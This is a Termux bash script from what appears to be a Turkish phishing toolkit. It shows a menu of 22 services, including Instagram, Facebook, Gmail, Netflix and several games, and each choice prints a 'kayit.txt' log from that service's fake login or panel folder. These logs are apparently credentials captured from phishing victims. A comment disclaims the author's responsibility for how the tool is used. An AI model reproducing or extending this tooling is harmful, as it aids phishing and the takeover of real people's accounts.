#!/data/data/com.termux/bin/bash
#!/bin/bash
#Code : Yaman Efkar
#Youtube : YamanEfkar
#İnstagram : @turksibertimi
#Bu toolun kullanımında meydana gelicek hiç bir şey sorumluluğumda değildir!Kişi yaptığı tüm işlerden kendisi sorumludur!                               #Turk-Sploi-Pluas

banner_code(){

        clear
        echo -e "\033[31;40;1m

                \e[36m            Code
         \e[32m******************************************

        \e[31m[\e[32m01\e[31m]\e[37mİnstagram Login       \e[31m[\e[32m17\e[31m]\e[37mSteam
        \e[31m[\e[32m02\e[31m]\e[37mİnstagram Panel       \e[31m[\e[32m18\e[31m]\e[37mLol
        \e[31m[\e[32m03\e[31m]\e[37mFacebook Login        \e[31m[\e[32m19\e[31m]\e[37mPubg
        \e[31m[\e[32m04\e[31m]\e[37mFacebook Panel        \e[31m[\e[32m20\e[31m]\e[37mWolfteam
        \e[31m[\e[32m05\e[31m]\e[37mTwitter Login         \e[31m[\e[32m21\e[31m]\e[37mZula
        \e[31m[\e[32m06\e[31m]\e[37mTwitter Panel         \e[31m[\e[32m22\e[31m]\e[37mLegend Online
        \e[31m[\e[32m07\e[31m]\e[37mYoutube
        \e[31m[\e[32m08\e[31m]\e[37mWhatsapp
        \e[31m[\e[32m09\e[31m]\e[37mSpofity
        \e[31m[\e[32m10\e[31m]\e[37mNetflix
        \e[31m[\e[32m11\e[31m]\e[37mBlu Tv
        \e[31m[\e[32m12\e[31m]\e[37mTikTok
        \e[31m[\e[32m13\e[31m]\e[37mTwitch
        \e[31m[\e[32m14\e[31m]\e[37mGmail
        \e[31m[\e[32m15\e[31m]\e[37mHotmail
        \e[31m[\e[32m16\e[31m]\e[37mYandex


    \e[31m[\e[32m99\e[31m]\e[37mBir Önceki Ana Menü
                        "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_code
}
banner_code

if [[ $islem_code == 1 || $islem_code == 01 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat instagram-login/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh


elif [[ $islem_code == 2 || $islem_code == 02 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat instagram-panel/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh


elif [[ $islem_code == 3 || $islem_code == 03 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat facebook-login/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 4 || $islem_code == 04 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat facebook-panel/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 5 || $islem_code == 05 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat twitter-login/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 6 || $islem_code == 06 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat twitter-panel/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 7 || $islem_code == 07 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat youtube/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 8 || $islem_code == 08 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat whatsapp/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 9 || $islem_code == 09 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat spofity/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 10 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat netflix/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 11 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat blutv/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 12 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat tiktok/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 13 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat twitch/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 14 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat gmail/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 15 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat hotmail/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 16 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat yandex/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 17 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat steam/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 18 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat lol/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 19 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat pubg/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 20 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat wolfteam/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 21 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat zula/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 22 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat legend/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        cd .. && bash tst.sh

elif [[ $islem_code == 9 || $islem_code == 99 ]]; then
                bash ../tst.sh

else
                echo -e '\033[31;40;1mİslem Numaranızı Kontrol Ediniz!'
                sleep 2
                bash code.sh
fi
